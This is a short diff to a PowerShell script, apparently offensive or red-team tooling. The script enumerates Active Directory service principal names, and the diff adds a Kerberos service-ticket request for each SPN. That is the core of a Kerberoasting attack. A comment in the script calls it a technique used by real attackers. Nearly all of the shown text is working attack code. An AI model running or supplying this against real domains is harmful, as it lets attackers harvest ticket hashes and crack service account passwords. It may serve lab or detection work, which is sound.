@@ -2,6 +2,9 @@
 # technique used by real attackers
 Import-Module .\Microsoft.ActiveDirectory.Management.dll
 
+#Add System.IdentityModel to make the request
+Add-Type -AssemblyName System.IdentityModel
+
 #Create a Directory Searh Object
 $searcher = New-Object System.DirectoryServices.DirectorySearcher
 
@@ -25,5 +28,8 @@ foreach($result in $results)
     {
         #Output the SPN
         $spn
+
+        #Request the Ticket
+        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$spn"
     }
 }
